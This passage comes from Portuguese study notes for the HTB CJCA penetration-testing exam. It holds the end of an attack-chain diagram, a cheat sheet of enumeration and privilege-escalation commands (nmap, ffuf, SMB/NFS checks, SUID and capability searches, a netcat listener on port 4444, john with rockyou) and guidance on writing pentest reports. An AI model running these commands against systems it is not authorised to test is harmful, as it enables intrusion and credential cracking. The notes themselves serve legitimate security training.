                  │ POST-EXPLOITATION│
                  └────────┬────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │     PRIVESC     │
                  └────────┬────────┘
                           │
                           ▼
                    ┌─────────────┐
                    │   OBJECTIVE  │
                    └─────────────┘
```

---

# 21. Comandos para Decorar

```bash
# Nmap
nmap -p- -sC -sV <IP>

# Web
ffuf -u http://<IP>/FUZZ -w wordlist.txt

# SMB
smbclient -L //<IP>/ -N

# NFS / FTP anon (sempre checa)
showmount -e <IP>
ftp <IP> # anonymous:anonymous

# WordPress
wpscan --url http://<IP> --enumerate --api-token <TOKEN>

# Linux
sudo -l
id
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# Windows
whoami /all
whoami /priv
systeminfo

# Network
ip a
ip route
ss -tulpn

# Listener
nc -lvnp 4444

# Hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

# 22. Reporting CJCA (vale reprovação sozinho)

Ordem: `Executive Summary (1-2 pág, sem sigla) -> Attack Chain -> Findings -> Remediation Summary -> Apêndice (escopo, metodologia)`.

Finding = 8 campos (usa p/ cada regra/box):
```text
Titulo / Severidade (CVSS) / Descrição / Impacto / Afetados / Como reproduzir + evidência / Remediação específica / Referência
```
- Remediação ruim: "reconfigure o registro". Boa: "mude X p/ Y em [caminho], teste em 1 host".
- Não indica vendor (fala SIEM/EDR, não Splunk/Crowd).
- Executive: números exatos (`7 achados: 5 high`), sem `Rubeus/Mimikatz`, fala "lemos RH/financeiro".
- Draft -> Final: manda draft, cliente comenta, vira final.
- Template prova: SysReptor + template HTB CJCA. Carrega ANTES do exame:
  - Sample 19p: https://docs.sysreptor.com/assets/reports/HTB-CJCA-Report.pdf
  - Repo: https://github.com/Syslifters/HackTheBox-Reporting
- Evidência: prefere texto de terminal (comando azul, output vermelho, `<SNIP>` p/ corte, nunca inventa). Print: corta relevante, deixa IP/URL visível. Tarja preta sólida, nunca blur (reverte com Unredacter). Texto usa `<REDACTED>`.
- Ver `Documentation & Reporting.md` (Activity Log, Credentials, Findings/, Scans, snapshot DD/MM + IPs).
